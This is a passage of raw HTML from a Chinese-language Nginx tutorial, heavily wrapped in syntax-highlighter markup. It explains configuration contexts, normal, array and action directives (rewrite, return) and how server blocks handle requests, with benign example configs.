class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nworker_processes 2; # 全局上下文指令\r\n\r\nhttp {              # http 上下文\r\n    gzip on;        # http 上下文中的指令\r\n\r\n  server {          # server 上下文\r\n    listen 80;      # server 上下文中的指令\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ac451440402-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ac451440402-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ac451440402-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ac451440402-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ac451440402-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ac451440402-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ac451440402-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ac451440402-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ac451440402-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ac451440402-1\"><span class=\"crayon-v\">worker</span><span class=\"crayon-sy\">_</span>processes <span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span> <span class=\"crayon-p\"># 全局上下文指令</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ac451440402-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ac451440402-3\"><span class=\"crayon-e\">http</span> <span class=\"crayon-sy\">{</span>              <span class=\"crayon-p\"># http 上下文</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ac451440402-4\">    <span class=\"crayon-i\">gzip</span> <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span>        <span class=\"crayon-p\"># http 上下文中的指令</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ac451440402-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ac451440402-6\">  <span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span>          <span class=\"crayon-p\"># server 上下文</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ac451440402-7\">    <span class=\"crayon-i\">listen</span> <span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span>      <span class=\"crayon-p\"># server 上下文中的指令</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ac451440402-8\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ac451440402-9\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h2>指令类型</h2>\n<p>在多个上下文中使用相同的指令时，必须要小心，因为继承模型不同时有着不同的指令。有三种类型的指令，每种都有自己的继承模型。</p>\n<h3>普通指令</h3>\n<p>在每个上下文仅有唯一值。而且，它只能在当前上下文中定义一次。子级上下文可以覆盖父级中的值，并且这个覆盖值只在当前的子级上下文中有效。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32b0573193484\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngzip on;\r\ngzip off; # 非法，不能在同一个上下文中指定同一普通指令2次\r\n\r\nserver {\r\n  location /downloads {\r\n    gzip off;\r\n  }\r\n\r\n  location /assets {\r\n    # gzip is on here\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b0573193484-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b0573193484-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b0573193484-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b0573193484-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b0573193484-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b0573193484-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b0573193484-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b0573193484-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b0573193484-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b0573193484-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b0573193484-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b0573193484-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b0573193484-1\"><span class=\"crayon-i\">gzip</span> <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b0573193484-2\"><span class=\"crayon-i\">gzip</span> <span class=\"crayon-v\">off</span><span class=\"crayon-sy\">;</span> <span class=\"crayon-p\"># 非法，不能在同一个上下文中指定同一普通指令2次</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b0573193484-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b0573193484-4\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b0573193484-5\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">downloads</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b0573193484-6\">    <span class=\"crayon-i\">gzip</span> <span class=\"crayon-v\">off</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b0573193484-7\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b0573193484-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b0573193484-9\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">assets</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b0573193484-10\">    <span class=\"crayon-p\"># gzip is on here</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b0573193484-11\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b0573193484-12\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3>数组指令</h3>\n<p>在同一上下文中添加多条指令，将添加多个值，而不是完全覆盖。在子级上下文中定义指令将覆盖给父级上下文中的值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32b4598708944\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nerror_log /var/log/nginx/error.log;\r\nerror_log /var/log/nginx/error_notive.log notice;\r\nerror_log /var/log/nginx/error_debug.log debug;\r\n\r\nserver {\r\n  location /downloads {\r\n    # 下面的配置会覆盖父级上下文中的指令\r\n    error_log /var/log/nginx/error_downloads.log;\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b4598708944-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b4598708944-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b4598708944-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b4598708944-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b4598708944-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b4598708944-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b4598708944-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b4598708944-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b4598708944-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b4598708944-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b4598708944-1\"><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">_</span>log <span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b4598708944-2\"><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">_</span>log <span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">error_notive</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span> <span class=\"crayon-v\">notice</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b4598708944-3\"><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">_</span>log <span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">error_debug</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span> <span class=\"crayon-v\">debug</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b4598708944-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b4598708944-5\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b4598708944-6\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">downloads</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b4598708944-7\">    <span class=\"crayon-p\"># 下面的配置会覆盖父级上下文中的指令</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b4598708944-8\">    <span class=\"crayon-v\">error</span><span class=\"crayon-sy\">_</span>log <span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">error_downloads</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b4598708944-9\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b4598708944-10\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p></p>\n<h3>行动指令</h3>\n<p>行动是改变事情的指令。根据模块的需要，它继承的行为可能会有所不同。</p>\n<p>例如 rewrite 指令，只要是匹配的都会执行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32b7144258538\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver {\r\n  rewrite ^ /foobar;\r\n\r\n  location /foobar {\r\n    rewrite ^ /foo;\r\n    rewrite ^ /bar;\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b7144258538-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b7144258538-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b7144258538-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b7144258538-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b7144258538-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b7144258538-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32b7144258538-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32b7144258538-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b7144258538-1\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b7144258538-2\">  <span class=\"crayon-i\">rewrite</span> <span class=\"crayon-o\">^</span> <span class=\"crayon-o\">/</span><span class=\"crayon-v\">foobar</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b7144258538-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b7144258538-4\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">foobar</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b7144258538-5\">    <span class=\"crayon-i\">rewrite</span> <span class=\"crayon-o\">^</span> <span class=\"crayon-o\">/</span><span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b7144258538-6\">    <span class=\"crayon-i\">rewrite</span> <span class=\"crayon-o\">^</span> <span class=\"crayon-o\">/</span><span class=\"crayon-v\">bar</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32b7144258538-7\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32b7144258538-8\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>如果用户想尝试获取 /sample：</p>\n<ul>\n<li>server的rewrite将会执行，从 /sample rewrite 到 /foobar</li>\n<li>location /foobar 会被匹配</li>\n<li>location的第一个rewrite执行，从/foobar rewrite到/foo</li>\n<li>location的第二个rewrite执行，从/foo rewrite到/bar</li>\n</ul>\n<p>return 指令提供的是不同的行为：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32bb245778855\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver {\r\n  location / {\r\n    return 200;\r\n    return 404;\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32bb245778855-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32bb245778855-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32bb245778855-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32bb245778855-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32bb245778855-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32bb245778855-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32bb245778855-1\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32bb245778855-2\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32bb245778855-3\">    <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32bb245778855-4\">    <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">404</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32bb245778855-5\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32bb245778855-6\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>在上述的情况下，立即返回200。</p>\n<h2>处理请求</h2>\n<p>在 Nginx 内部，你可以指定多个虚拟服务器，每个虚拟服务器用 server{} 上下文描述。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32be633532963\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver {\r\n  listen      *:80 default_server;\r\n  server_name netguru.co;\r\n\r\n  return 200 \"Hello from netguru.co\";\r\n}\r\n\r\nserver {\r\n  listen      *:80;\r\n  server_name foo.co;\r\n\r\n  return 200 \"Hello from foo.co\";\r\n}\r\n\r\nserver {\r\n  listen      *:81;\r\n  server_name bar.co;\r\n\r\n  return 200 \"Hello from bar.co\";\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" 